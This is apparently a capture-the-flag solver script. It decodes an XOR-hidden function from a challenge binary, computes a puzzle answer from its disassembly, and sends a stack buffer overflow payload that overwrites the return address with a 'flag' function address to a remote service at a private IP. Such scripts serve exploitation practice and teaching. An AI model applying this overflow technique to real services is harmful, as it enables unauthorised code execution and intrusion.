'''
awk '/<puzzle_x86_64>:/,/<cookie>:/{print}' bin.asm |grep -v '<puzzle_x86_64>:'|grep -v '<cookie>:'|awk -F'\t' '{print $2}'
'''
#!/usr/bin/python3

import os
from pwn import *
#cmd = "nc 10.102.60.248 443 > bin_2"
#os.system(cmd)

cmd = "objdump -D bin_2 > bin_2.asm"
os.system(cmd)

cmd = "awk '/<puzzle_x86_64>:/,/<cookie>:/{print}' bin_2.asm |grep -v '<puzzle_x86_64>:'|grep -v '<cookie>:'|awk -F'\t' '{print $2}'"
proc = os.popen(cmd)
buf = proc.read().replace('\n','').replace(' ','')
proc.close()
bbuf = bytes.fromhex(buf)
#bbuf = buf.decode('hex')
ifname = ''
for i in range(256):
        buf = xor(bbuf, i)
        if buf.hex()[:8] == 'f30f1efa':
            with open('bin'+str(i), 'wb') as f:
                f.write(buf)
            ifname = str(i)
            break

proc = os.popen('ndisasm -b 64 bin'+ifname)
buf = proc.read()
proc.close()
with open('bin'+ifname+'.asm', 'w') as f:
       f.write(buf)

#cmd = "grep F30F1EFA *.asm|awk -F: '{print $1}'"
#proc = os.popen(cmd)
#fname = proc.read().replace('\n','')
#proc.close()
fname = 'bin'+ifname+'.asm'
with open(fname, 'r') as f:
	lines = f.readlines()
#print(lines)

#ifname = fname[3:-4]
sf = 0
x = 0
for i in range(len(lines)):
	match = re.match(r'.*and .*(0x.*)', lines[i], re.M|re.I)
	if match:
		match2 = re.match(r'.*jnz.*', lines[i+2], re.M|re.I)
		if match2:
			x += int(match.group(1),16)
	if sf == 0:
		match = re.match(r'.*test eax,eax', lines[i], re.M|re.I)
		if match:
			match2 = re.match(r'.*js.*', lines[i+1], re.M|re.I)
			if match2:
				sf = 1
				x += 2**31

#print(ifname)
#print(x)

cmd = "grep '<flag>:' bin_2.asm |awk '{print $1}'"
proc = os.popen(cmd)
addr = p64(int(proc.read().replace('\n',''),16))
proc.close()
#print(addr)
addr = p64(0x401183)

cmd = " awk '/<vuln>:/,/lea/{print}' bin_2.asm"
proc = os.popen(cmd)
buf = proc.read().split('\n')
buflen = int(buf[4].split('\t')[2].split()[1].split(',')[0][1:],16)
if buflen > 2**63:
    buflen = 2**64 - buflen
magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
rbp = p64(0x7fffffffff80)
shellcode = b'A'*(buflen-4)+magic+rbp+addr
#shellcode = 'A'*(buflen-4)+magic+rbp+addr

#cmd = "chmod +x bin_2"
#os.system(cmd)
#io = process('./bin_2')

io = remote('10.102.60.248',1180)

io.recvuntil(' hmmm.....')
io.sendline(ifname)
io.sendline(str(x))
io.sendline(shellcode)
print(magic)
print(rbp)
print(addr)
print(shellcode)
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
